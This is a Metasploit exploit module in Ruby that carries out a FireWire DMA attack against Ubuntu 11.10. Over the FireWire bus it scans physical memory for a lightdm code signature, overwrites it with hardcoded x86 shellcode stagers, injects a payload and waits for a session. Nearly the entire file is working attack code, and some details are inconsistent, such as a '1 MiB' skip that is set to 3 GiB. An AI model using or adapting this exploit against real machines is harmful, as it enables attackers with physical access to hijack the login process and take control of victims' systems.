require 'msf/core'
require '~/.msf4/external/forensic1394/bus.rb'

class Metasploit3 < Msf::Exploit::Local
    # Rank = ExcellentRanking

	def initialize(info = {})
		super(update_info(info,
            # TODO: fix before deployment
			'Name'           => 'farm <= 11.10 Firewire DMA attack to overwrite lightdm code',
			'Description'    => %q{
                Firewire lightdm attack.
          	},
			'Author'         => [ 'albert', 'Mr.Breaker' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 0.12 $',
			'References'     =>
				[
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 296,
                    'Encoder'     => 'generic/none'
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Targets'	=>
				[
					[ 'Ubuntu 11.10', { 'Offset' => 0x590, 'Signature' =>
                        "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24", 'Space' => 2048 } ],
				],
			'DefaultTarget'	=> 0,
        	'DisclosureDate' => 'Long long ago', 
        ))
        register_options(
			[
			], self.class)

		register_advanced_options(
			[
			], self.class)
	end

	def exploit
        stagerpatch = "\xe8\x00\x00\x00\x00\x60\x31\xc0" +
                      "\xb0\xc0\x31\xdb\x31\xc9\xb5\x10" +
                      "\x99\xb2\x07\xbe\x22\x00\x00\x00" +
                      "\xcd\x80\x66\xc7\x00\xff\xe0\xff\xe0" 

        sig = target['Signature']
        
        #patch = forkpatch + payload.encoded
        off = target['Offset'] 

        # Print phase, method and patch parameters
        puts '        Using signature: %s' % bin2hex(sig)
        puts '        Using patch:     %s' % bin2hex(stagerpatch)
        puts '        Using offset:    %x' % off

        # Initialize
        b = Bus.new
        d = initialize_fw(b)
         
        ##
        # Stage 1: find memory to patch and insert the stager
        ##
        puts 'Starting attack...'
        oldmem = patchPage(d,sig,stagerpatch,off)

        ##
        # Stage 2: insert second stager and payload and replace old memory
        ##
        page = "\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x0c\x61\x83\x2c\x24\x05\x83\xc4\x04\xff\x64\x24\xfc"
        stagesig = "\xff\xe0"
        patch = page + payload.encoded

        # Wait for user input
        puts 'Press enter if patch on target is run'
        gets
        d.write(oldmem[0],oldmem[1]) # replace patched memory

        puts 'Searching for payload page'

        patchPage(d, stagesig,patch, 0)

        ##
        # Stage 3: wait for the session to be created
        ##
		print_status "Starting the payload handler..."
		while(!session_created?)
			select(nil,nil,nil,1)
		end

        b.delete
 	end

    def initialize_fw(b)
        # Enable SBP-2 support to ensure we get DMA
        b.enable_sbp2()

        begin
            for i in 2.downto(1)
                puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i
                STDOUT.flush
                sleep(1)
            end
        rescue 
            puts 'Interrupted'
        end 
        puts ''

        # Open the first device
        d = b.devices
        raise 'nothing connected' if d.length <= 0

        d[0].open()

        return d[0]
    end 

    # Tries to find signature on a page at offset at device d 
    def patchPage(d,sig,patch,off)
        # Find memory size
        memsize = 4 * 1024 * 1024  * 1024

        begin        
            addr = findsig(d, sig, off, memsize)
            fail('Signature not found.') if !addr

            puts 'Signature found at 0x%x.' % addr
            oldmem = d.read(addr, patch.length) # save patched data
            d.write(addr, patch)
            puts 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch

            return [addr,oldmem]
        rescue IOError => e
            fail( e.message + ' Make sure FireWire interfaces are properly connected.' )
        end
    end

    def findsig(d, sig, off, memsize)
        pagesize = 4096 
        # Skip the first 1 MiB of memory
        one_mb = 3 * 1024 * 1024 * 1024
        
        for addr in (one_mb + off..memsize).step(pagesize)
            return addr if sig == d.read(addr, sig.length)
        end
    end          

    def fail(msg) # This is abort()
        puts "\n [!] Attack unsuccessful. " + msg
    end

    def bin2hex(s)
        return s.unpack('C*').map{ |b| "%02X" % b }.join('')
    end
end
